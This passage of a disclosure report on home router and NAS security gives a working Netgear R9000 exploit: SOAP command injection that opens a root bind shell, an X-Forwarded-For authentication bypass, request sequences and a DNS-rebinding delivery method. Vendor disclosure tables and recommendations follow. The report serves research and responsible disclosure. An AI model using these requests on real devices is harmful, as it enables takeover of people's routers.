+								<p>During initial testing and scanning, we also turned to hidden, but well documented,
+									debug endpoints in the web interface. The page at "/debug.htm" is particularly
+									useful, as it allows an authenticated user to spawn a telnet server and gain access
+									to a root shell. This is not a vulnerability, as access requires the administrator's
+									username and password, but this feature does provide a useful foothold for further
+									instrumentation and analysis of the device. Using this foothold, we were able to
+									perform static analysis of the web application, locate potentially vulnerable code
+									paths, and then perform live analysis of targeted code paths.</p>
+								<p>Our analysis determined that the SOAP API performed numerous calls to a shell, some
+									of which appeared to contain dangerous user input. Although most of these dangerous
+									calls were inaccessible, we were able to observe user input passing through
+									"<code>AdvancedQoS:1#GetCurrentBandwidthByMAC</code>" via the
+									"<code>NewDeviceMAC</code>" element. However, this input is heavily mangled. The
+									following limitations apply:</p>
+								<ul>
+									<li>No more than 17 characters may be used.</li>
+									<li>At least one colon must be included to prevent mangling.</li>
+									<li>A single-quote and meta-character must be used to break out of the existing
+										command.</li>
+									<li>Parent command remnants after the injection point must be dealt with.</li>
+									<li>The payload must be in all-caps.</li>
+								</ul>
+								<p>Despite these limitations, we were still able to gain access to an interactive root
+									shell via this vulnerability. Since the web server assigns certain HTTP headers to
+									environment variables with all-caps names, it is possible to insert a payload into
+									one such header and reference the subsequent environment variable in the injection
+									point. A fully-functional PoC capable of spawning an unauthenticated bind shell on
+									port 8383 is provided below. Note that the "<code>SessionID</code>" element is not
+									checked and may be any value.</p>
+								<p><code>POST /soap/server_sa/ HTTP/1.1<br />
+SOAPAction: urn:NETGEAR-ROUTER:service:AdvancedQoS:1#GetCurrentBandwidthByMAC<br />
+X-Forwarded-For: 192.168.1.1<br />
+Range: utelnetd -d -p 8383 -l /bin/sh</code></p>
+								<p><code><span style="font-weight: 400;">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SOAP-ENV:Envelope&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SOAP-ENV:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/SOAP-ENV:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SOAP-ENV:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;M1:GetCurrentBandwidthByMAC&gt;<br />
+</span></code><code><span style="font-weight: 400;">  &lt;NewDeviceMAC&gt;:';$HTTP_RANGE ##&lt;/NewDeviceMAC&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/M1:GetCurrentBandwidthByMAC&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/SOAP-ENV:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/SOAP-ENV:Envelope&gt;</span></code></p>
+								<p>&nbsp;</p>
+								<p>Although this attack requires QoS and Advanced QoS services being enabled, as well as
+									authentication, these requirements can be bypassed to achieve successful
+									exploitation on a device in its factory state. Authentication can be bypassed with
+									the aforementioned X-Forwarded-For bypass. Simply add an X-Forwarded-For header with
+									a value of the router's LAN IP address (192.168.1.1). Using this authentication
+									bypass, an attacker can enable QoS and Advanced QoS using the following 4 requests.
+								</p>
+								<p><code><span style="font-weight: 400;">POST /soap/server_sa/ HTTP/1.1<br />
+</span></code><code><span style="font-weight: 400;">SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#ConfigurationStarted<br />
+</span></code><code><span style="font-weight: 400;">X-Forwarded-For: 192.168.1.1</span></code></p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SOAP-ENV:Envelope&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SOAP-ENV:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/SOAP-ENV:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;SOAP-ENV:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;M1:ConfigurationStarted&gt;<br />
+</span></code><code><span style="font-weight: 400;">   &lt;NewSessionID&gt;424F474F4E424F474F4E&lt;/NewSessionID&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/M1:ConfigurationStarted&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/SOAP-ENV:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/SOAP-ENV:Envelope&gt;</span></code></p>
+								<p class="text-center"><i><span style="font-weight: 400;">Request 1</span></i>
+								</p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">POST /soap/server_sa/ HTTP/1.1<br />
+</span></code><code><span style="font-weight: 400;">SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SetQoSEnableStatus<br />
+</span></code><code><span style="font-weight: 400;">X-Forwarded-For: 192.168.1.1</span></code></p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;soap:Envelope&gt;<br />
+</span></code><code><span style="font-weight: 400;">   &lt;soap:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">     &lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;<br />
+</span></code><code><span style="font-weight: 400;">  &lt;/soap:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">  &lt;soap:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">    &lt;M1:SetQoSEnableStatus&gt;<br />
+</span></code><code><span style="font-weight: 400;">  </span>  <span style="font-weight: 400;">&lt;NewQoSEnable&gt;1&lt;/NewQoSEnable&gt;<br />
+</span></code><code><span style="font-weight: 400;">    &lt;/M1:SetQoSEnableStatus&gt;<br />
+</span></code><code><span style="font-weight: 400;">  &lt;/soap:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/soap:Envelope&gt;</span></code></p>
+								<p>&nbsp;</p>
+								<p class="text-center"><i><span style="font-weight: 400;">Request 2</span></i>
+								</p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">POST /soap/server_sa/ HTTP/1.1<br />
+</span></code><code><span style="font-weight: 400;">SOAPAction: urn:NETGEAR-ROUTER:service:AdvancedQoS:1#SetQoSEnableStatus<br />
+</span></code><code><span style="font-weight: 400;">X-Forwarded-For: 192.168.1.1</span></code></p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;soap:Envelope&gt;<br />
+</span></code><code><span style="font-weight: 400;">   &lt;soap:Header&gt;<br />
+</span></code><code><span style="font-weight: 400;">      &lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;<br />
+</span></code><code><span style="font-weight: 400;">  &lt;/soap:Header&gt;<br />
+</span></code><code>  &lt;soap:Body&gt;<br />
+</code><code><span style="font-weight: 400;">      &lt;M1:SetQoSEnableStatus&gt;<br />
+</span></code><code><span style="font-weight: 400;">  </span>    <span style="font-weight: 400;">&lt;NewQoSEnable&gt;1&lt;/NewQoSEnable&gt;<br />
+</span></code><code><span style="font-weight: 400;">      &lt;/M1:SetQoSEnableStatus&gt;<br />
+</span></code><code><span style="font-weight: 400;">  &lt;/soap:Body&gt;<br />
+</span></code><code><span style="font-weight: 400;">&lt;/soap:Envelope&gt;</span></code></p>
+								<p class="text-center"><i><span style="font-weight: 400;">Request 3</span></i>
+								</p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">POST /soap/server_sa/ HTTP/1.1<br />
+</span><span style="font-weight: 400;">SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#ConfigurationFinished<br />
+</span><span style="font-weight: 400;">X-Forwarded-For: 192.168.1.1</span></code></p>
+								<p>&nbsp;</p>
+								<p><code><span style="font-weight: 400;">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;<br />
+</span><span style="font-weight: 400;">&lt;SOAP-ENV:Envelope&gt;<br />
+</span><span style="font-weight: 400;">&lt;SOAP-ENV:Header&gt;<br />
+</span><span style="font-weight: 400;">&lt;SessionID&gt;424F474F4E424F474F4E&lt;/SessionID&gt;<br />
+</span><span style="font-weight: 400;">&lt;/SOAP-ENV:Header&gt;<br />
+</span><span style="font-weight: 400;">&lt;SOAP-ENV:Body&gt;<br />
+</span><span style="font-weight: 400;">&lt;M1:ConfigurationFinished&gt;<br />
+</span><span style="font-weight: 400;">  &lt;NewStatus&gt;ChangesApplied&lt;/NewStatus&gt;<br />
+</span><span style="font-weight: 400;">&lt;/M1:ConfigurationFinished&gt;<br />
+</span><span style="font-weight: 400;">&lt;/SOAP-ENV:Body&gt;<br />
+</span><span style="font-weight: 400;">&lt;/SOAP-ENV:Envelope&gt;</span></code></p>
+								<p class="text-center"><i><span style="font-weight: 400;">Request 4</span></i>
+								</p>
+								<p>After performing these requests, it will be possible to execute the aforementioned
+									command injection attack. However, the attack may not work immediately. If injection
+									fails, generate web traffic flowing through the router (e.g., load images on a
+									remote web site) and try again.</p>
+								<p>Although all of the examples shown above assume that an attacker is on the LAN
+									network, they may be performed remotely via DNS rebinding. Such an attack functions
+									similarly to Cross-Site Request Forgery, involving a victim on the router's LAN
+									visiting an attacker-controlled page which instructs the victim's browser to issue
+									malicious requests to the router. DNS rebinding differs from CSRF in that it can
+									bypass cross-origin restrictions but cannot leverage any existing session cookies.
+									For the Nighthawk R9000, this is perfect. The only thing preventing all previously
+									shown PoCs from being executed via JavaScript XHR is request pre-flighting due as it
+									is cross-origin. Since DNS rebinding is seen as a single origin, this pre-flight
+									requirement is no longer applicable. As such, an attacker can force a victim's
+									browser to exploit the victim's router by simply coercing the victim into navigating
+									to an attacker controlled page.</p>
+								<h3>New Developments in IoT Security</h3>
+								<p>The five years between SOHOpelessly Broken 1.0 and 2.0 saw several changes in
+									security controls, as well as the atmosphere around security and vulnerability
+									disclosures. Here, we examine some of the differences between our SOHOpelessly
+									Broken studies.</p>
+								<p><strong>Technical Changes in IoT Security</strong><br />
+									In 2013, many IoT devices were designed to be easy-to-use and low-cost. While much
+									of that remains the same, hardware and security advances have allowed for new
+									features, including some designed to enhance security without harming manufacturing
+									costs. For example, in SOHOpelessly Broken 2.0 we observed Asus routers with
+									address-space layout randomization (ASLR), a hardening feature that makes the
+									exploitation of buffer-overflow attacks more difficult. None of the devices in
+									SOHOpelessly Broken 1.0 had ASLR implemented. We also found that some manufacturers
+									have implemented functionality that hinders reverse engineering. The Terramaster
+									F2-420 encrypts files used to serve their PHP web application using a PHP module
+									called “screw_aes”, complicating the process of accessing the source code of the
+									administrative panel. The Seagate STCR3000101 has its own request integrity
+									verification mechanism that prevents attackers from modifying HTTP requests.</p>
+								<p>Perhaps more interesting is the amount of approaches that have not changed since
+									SOHOpelessly Broken 1.0. Features such as anti-CSRF tokens and browser security
+									headers, which are commonplace in mainstream web applications, are still rare among
+									our sample of devices. These defense-in-depth mechanisms can greatly enhance the
+									security posture of web applications and the underlying systems they interact with.
+									In many cases, our remote exploits wouldn’t have worked if customary web application
+									security practices had been implemented.</p>
+								<p><strong>Non-Technical changes in IoT Security</strong><br />
+									By 2018, many IoT device manufacturers have taken steps to improve their security
+									efforts. Netgear, Synology, QNAP, and Xiaomi have bug bounty programs that
+									compensate researchers who disclose vulnerabilities. Lenovo and Asus have “hall of
+									fame” pages that recognize researchers who have submitted vulnerabilities through
+									their disclosure program.</p>
+								<p>In addition to or in lieu of bug bounty programs, some device manufacturers have
+									security contacts that can be used for disclosing vulnerabilities. Typically, this
+									is an email address that can be found on the security page of the manufacturer’s
+									website.</p>
+								<p>Another non-technical change we found in our comparison was the introduction of the
+									CVE Numbering Authorities (CNA) program. Publicly disclosed vulnerabilities are
+									frequently assigned identifiers called Common Vulnerabilities and Exposures (CVE)
+									numbers that simplify security issue tracking for vendors, system administrators,
+									and users. The MITRE Corporation is in charge of managing the program that assigns
+									and manages CVEs. Historically, MITRE was the only entity that could assign CVE
+									numbers; however, this has changed with the CNA program that allows registered
+									companies and organizations to assign CVE numbers. Some of the manufacturers of the
+									devices we assessed were CNAs and provided ISE with CVE numbers.</p>
+								<p>The CNA program is not without flaws. During our study we attempted to apply for CVEs
+									through Netgear for the vulnerabilities we discovered in the Netgear Nighthawk R9000
+									but were ignored from December 2018 until April of 2019 when we informed MITRE that
+									we received an email from Netgear stating that they were no longer issuing CVEs as a
+									CNA. In the end, we received CVEs for these issues from MITRE.</p>
+								<p>With increased attention to security and improved security features one might infer
+									an associated increase in device security. This should result in a reduced number of
+									vulnerabilities, particularly high-severity issues. Based on the devices we included
+									in our study we did not see such results.</p>
+								<h3>Responsible Disclosure</h3>
+								<p>We responsibly disclosed all of the vulnerabilities we identified to device
+									manufacturers. As described above, sometimes this occurred as bug bounty
+									disclosures, other times we directly contacted the manufacturer. Most vendors were
+									responsive and acknowledged receipt of the reported vulnerabilities. In some cases,
+									we worked with the manufacturers to reproduce issues or explain details.</p>
+								<p>Of the manufacturers that we interacted with, three of them were CVE Numbering
+									Authorities (CNAs) [**11]. Those manufacturers were Lenovo Group Ltd., QNAP Systems,
+									Inc., and Synology Inc. A fourth, Netgear Inc., was a CNA until early 2019, though
+									it is unclear as to why they left the program. Presumably, companies becoming CNAs
+									shows their interest in being more involved with the security community as they now
+									have an additional avenue for directly interfacing with researchers.</p>
+								<p>In addition, the following manufacturers offer a bug bounty program: Synology Inc.,
+									Xiaomi Corp., Netgear Inc. Of those, Synology and Netgear offer a cash bounty while
+									Xiaomi offers merchandise prizes. Conversely, none of the manufacturers we worked
+									with during our original iteration of SOHOpelessly Broken offered a bug bounty for
+									vulnerabilities discovered in their products.</p>
+								<p>Unfortunately, not all disclosures were simple. Some companies did not respond to our
+									initial reporting of vulnerabilities. Others did not provide security contact
+									information at all, and we were forced to disclose reports to their general support
+									contact. Of the 13 manufacturers that we contacted, three of them did not respond to
+									our inquiries despite numerous attempts. These manufacturers were Drobo Inc.,
+									Buffalo Americas, Inc., and Zioncom Holdings Ltd. We have yet to receive any new
+									communication from Buffalo Americas Inc., and Zioncom Holdings Ltd. as of the date
+									we published this paper. We were able to get in contact Drobo Inc.; however, we did
+									not receive any other communications after we re-sent them our findings.</p>
+								<p>The table below summarizes some of the details about each manufacturer’s responsible
+									disclosure program.</p>
+								<p>&nbsp;</p>
+								<table>
+									<tbody>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><b>Product</b></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><b>Responsible
+													disclosure program?</b></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><b>Is a CNA?</b>
+											</td>
+											<td style="text-align: center; border: 1px solid #ddd;"><b>How were
+													vulnerabilities submitted?</b></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><b>Notable
+													Interactions</b></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Buffalo TeraStation TS5600D1206</span>
+											</td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed below:</span><span style="font-weight: 400;"><br />
+												</span> <span
+													style="font-weight: 400;">security@buffalo-technology.com </span><span
+													style="font-weight: 400;">support@buffalo-technology.com</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We contacted Buffalo at the email
+													addresses listed in the previous column on:</span></p>
+												<ul>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">June 22, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">July 2, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">July 3, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">August 22, 2018</span></li>
+												</ul>
+												<p><span style="font-weight: 400;">Buffalo has not acknowledged receipt
+														of our vulnerabilities.</span></p>
+											</td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Synology rt2600ac</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">bounty@synology.com</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Synology promptly verified our findings
+													and validated our exploits. </span></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">ASUS RT-AC3200</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to
+													security@asustor.com</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Asus promptly responded to our
+													vulnerability submission. They worked closely with us to ensure they
+													were mitigating the reported vulnerabilities appropriately. </span>
+											</td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Netgear Nighthawk R9000</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">*No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Through their bug bounty program on
+													BugCrowd</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Netgear exhibited severe communication
+													issues, resulting in our finding being patched long before our
+													reports were even confirmed. This was the longest and most arduous
+													disclosure of this research project. Nearly 5 months were spent
+													waiting for Netgear to respond to the BugCrowd reports, and an
+													additional 3 months were spent attempting to get CVEs from Netgear,
+													and then MITRE. After contacting MITRE, netgear was removed from the
+													official CVE numbering authority list.</span></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">TerraMaster F2-420</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to </span></p>
+												<p><span style="font-weight: 400;">support_us@terra-master.com</span>
+												</p>
+											</td>
+											<tdclass="text-center"><span style="font-weight: 400;">Terramaster
+													promptly responded to our vulnerability submission.</span></p>
+												<p><span style="font-weight: 400;">Despite not having a formal
+														responsible disclosure program, TerraMaster worked with our team
+														to ensure they understood the vulnerabilities we
+														reported. </span></p>
+											</td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Drobo 5N2</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to
+													support@drobo.com</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We contacted Drobo at the email addresses
+													listed in the previous column on:</span></p>
+												<ul>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">July 6, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">July 10, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">August 22, 2018</span></li>
+												</ul>
+												<p><span style="font-weight: 400;">Drobo has not acknowledged receipt of
+														our vulnerabilities.</span></p>
+											</td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Zyxel NSA325 v2</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to
+													security@zyxel.com.tw</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Zyxel promptly responded to our
+													vulnerability submission. The model we looked at is considered a
+													legacy model that has been “**end-of-life</span><span
+													style="font-weight: 400;">”. Zyxel informed us that they will be
+													using the vulnerabilities we reported as a means to help them secure
+													their current product line.</span></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">TOTOLINK A3002RU V1</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed below.</span><span style="font-weight: 400;"><br />
+												</span> <span style="font-weight: 400;">sales@zioncom.net </span><span
+													style="font-weight: 400;">security@zioncom.net </span><span
+													style="font-weight: 400;">admin@zioncom.net</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We contacted Zioncom, TOTOLINK’s
+													manufacturer, at the email addresses listed in the previous column
+													on:</span></p>
+												<ul>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">May 30, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">July 2, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">July 3, 2018</span></li>
+													<li style="font-weight: 400; text-align: left;"><span
+															style="font-weight: 400;">August 22, 2018</span></li>
+												</ul>
+												<p><span style="font-weight: 400;">Zioncom has not acknowledged receipt
+														of our vulnerabilities.</span></p>
+											</td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Asustor AS-602T</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed below.</span><span style="font-weight: 400;"><br />
+												</span> <span
+													style="font-weight: 400;">security@asustor.com, </span><span
+													style="font-weight: 400;">esupport@asustor.com</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Asustor promptly responded to our
+													vulnerability submission. </span></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Seagate STCR3000101</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed on their website for responsible disclosure. </span></p>
+												<p>&nbsp;</p>
+												<p><span style="font-weight: 400;">security.reporting@seagate.com</span>
+												</p>
+											</td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Seagate has a direct security contact for
+													vulnerability submissions. When submitting vulnerabilities,
+													researchers can encrypt their submissions with Seagate’s provided
+													PGP key. Seagate promptly responded to our vulnerability
+													submission.</span></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">QNAP TS-870</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed on their website for responsible disclosure. </span></p>
+												<p>&nbsp;</p>
+												<p><span style="font-weight: 400;">security@qnap.com</span></p>
+											</td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">QNAP has a direct security contact for
+													vulnerability submissions. When submitting vulnerabilities,
+													researchers can encrypt their submissions with QNAP’s provided PGP
+													key. QNAP promptly responded to our vulnerability submission.</span>
+											</td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Mi Router</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">No</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed on their website for responsible disclosure. </span></p>
+												<p><span style="font-weight: 400;">security@xiaomi.com</span></p>
+											</td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Xiaomi has a direct security contact for
+													vulnerability submissions. Xiaomi promptly responded to our
+													vulnerability submission.</span></td>
+										</tr>
+										<tr>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Lenovo ix4-300d </span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Yes</span></td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">We submitted them to the email addresses
+													listed on their website for responsible disclosure. </span></p>
+												<p><span style="font-weight: 400;">psirt@lenovo.com</span></p>
+											</td>
+											<td style="text-align: center; border: 1px solid #ddd;"><span
+													style="font-weight: 400;">Lenovo has a direct security contact for
+													vulnerability submissions. When submitting vulnerabilities,
+													researchers can encrypt their submissions with Lenovo’s provided PGP
+													key. Lenovo promptly responded to our vulnerability
+													submission.</span></td>
+										</tr>
+									</tbody>
+								</table>
+								<p><em><span style="font-weight: 400;">*Netgear was previously a CNA; however, they are
+											no longer a CNA as of 2019.<br />
+										</span><span style="font-weight: 400;">**It is unclear what efforts
+											manufacturers made to reach out to customers to notify them that their
+											device was EOL and may have unpatched vulnerabilities, nor how clear their
+											policy for publishing expected product lifetimes are. </span></em></p>
+								<h3>Recommendations</h3>
+								<p>Below we have broken down our recommendations for improving the state of IoT security
+									for both current and future devices. In this section we provide recommendations for
+									manufacturers and consumers.</p>
+								<p><strong>Device Manufacturers</strong><br />
+									We have seen that the vendors of Internet of Things devices have increased their
+									presence in the security community, albeit without any substantial increases to
+									device security. We believe that manufacturers must begin training their developers
+									on security best practices and utilize either internal or external security teams to
+									audit the software running on their devices. Software must be developed with
+									security in mind from the initial planning stages and security must be considered in
+									all stages thereafter. Such a software development lifecycle should improve the
+									security of resultant systems; however, it is equally important to perform active
+									security testing on devices that utilizes threat models and methodologies as used by
+									real-world adversaries.</p>
+								<p><strong>Consumers and Enterprise Users</strong><br />
+									When purchasing new IoT equipment, the security of devices should be of importance.
+									Manufacturers with a history of numerous security vulnerabilities should be avoided;
+									likewise, how a manufacturer has handled patching issues and the length of time that
+									devices are supported should also be important considerations.</p>
+								<p>After devices have been purchased and installed, administrators should harden them by
+									disabling unused features, enabling security controls, if available, and
+									implementing a patching strategy to regularly apply firmware updates. In particular,
+									remote access features should be avoided when possible as they expose the device to
+									adversaries on the Internet, rather than limiting threats to those on an internal
+									network.</p>
+								<h3>Conclusion</h3>
+								<p>The research we performed in SOHOpelessly Broken 2.0 shows that many popular IoT
+									devices are vulnerable to remote exploits. The devices we exploited were not limited
+									to a single manufacturer, and most are well-received models from reputable brands in
+									the industry.</p>
+								<p>The growth of security awareness through programs such as bug bounties may result in
+									vulnerabilities being patched, but their existence in the first place is troubling.
+									Trivially exploited OS CMDi vulnerabilities, for example, are common in the devices
+									we researched. Such flaws would be considered unacceptable in modern web
+									applications in non-IoT environments. Patching vulnerabilities after the device
+									release is also problematic. It is likely that a significant number of devices are
+									deployed and never updated afterwards. These devices will be vulnerable to any
+									publicly-disclosed issues, even if patched firmware is made available.</p>
+								<p>Through SOHOpelessly Broken 2.0, we have shown how the current security controls of
+									IoT vendors do not prevent remote attackers from fully compromising a targeted
+									device. While some of the models required a higher-level of effort to discover the
+									issues, many can be easily exploited by anyone with network-level access to the
+									device. With these results, we can conclude that common devices that are deployed in
+									small office and home office environments are likely vulnerable to exploits that can
+									result in severe damage--despite the increased attention to security that IoT device
+									manufacturers have given since 2013.</p>
+								<h3>Additional Research</h3>
+								<p>Our research was designed to find remotely exploitable issues that could be leveraged
+									to fully compromise our targets. It was not an exhaustive search for
+									vulnerabilities. Many device services and features were not examined.</p>
+								<p>In future revisions, we would like to look at shared libraries between our targets.
+									Our end goal would still be to find remotely exploitable issues, however we wouldn’t
+									focus heavily on the administrative panel of our targets. We could also look at
+									authentication token generation. Many of our targets have developed their own
+									session token generation and verification workflows. Identifying security issues in
+									session token generation could grant us the ability to authenticate or elevate our
+									privileges on our targets. Last, we would also be interested in looking at firmware
